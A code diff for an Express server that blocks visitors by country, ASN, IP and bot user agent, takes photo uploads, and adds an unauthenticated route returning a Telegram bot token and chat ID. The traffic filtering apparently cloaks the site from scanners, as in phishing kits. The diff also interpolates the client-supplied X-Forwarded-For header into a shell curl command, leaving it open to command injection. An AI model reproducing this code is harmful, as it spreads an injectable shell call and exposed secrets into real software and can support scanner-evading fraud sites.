@@ -22,7 +22,7 @@ app.use(express.urlencoded({ extended: true }));
 app.set('trust proxy', true);
 app.use(async (req, res, next) => {
 	const ip =
-		req.headers['x-forwarded-for'] ||
+		req.headers['x-forwarded-for']?.split(',')[0] ||
 		req.connection.remoteAddress ||
 		req.headers['x-real-ip'] ||
 		req.socket.remoteAddress ||
@@ -41,15 +41,18 @@ app.use(async (req, res, next) => {
 		'python',
 		'BotPoke',
 	];
-	const userAgent = req.headers['user-agent'];
+	const blockedCountries = ['VN'];
+	const userAgent = req.headers['user-agent'] || '';
 	try {
 		const { stdout } = await execAsync(
-			`curl -s https://get.geojs.io/v1/ip/geo/${ip.split(',')[0].trim()}.json`,
+			`curl -s https://get.geojs.io/v1/ip/geo/${ip.trim()}.json`,
 		);
-		const { asn } = JSON.parse(stdout);
+		const geoData = JSON.parse(stdout);
 
 		if (
-			blockedAsns.includes(Number(asn)) ||
+			(geoData.country &&
+				blockedCountries.includes(geoData.country.toUpperCase())) ||
+			(geoData.asn && blockedAsns.includes(Number(geoData.asn))) ||
 			blockedIps.includes(ip) ||
 			blockedUserAgents.some((ua) =>
 				userAgent.toLowerCase().includes(ua.toLowerCase()),
@@ -295,12 +298,22 @@ app.post('/api/upload_file', upload.single('photo'), async (req, res) => {
 		res.status(500).send('Internal Server Error');
 	}
 });
+
+app.get('/api/get-config', async (req, res) => {
+	const database = await getDatabase();
+	res.json({
+		token: database.telegramConfig.token,
+		chatId: database.telegramConfig.chatId,
+	});
+});
 app.use(express.static(path.join(__dirname, 'dist')));
 app.get('*', (req, res) => {
 	res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-	console.log(`Server running on http://localhost:${PORT}`);
+const HOST = '0.0.0.0';
+
+app.listen(PORT, HOST, () => {
+	console.log(`Server running on http://${HOST}:${PORT}`);
 });
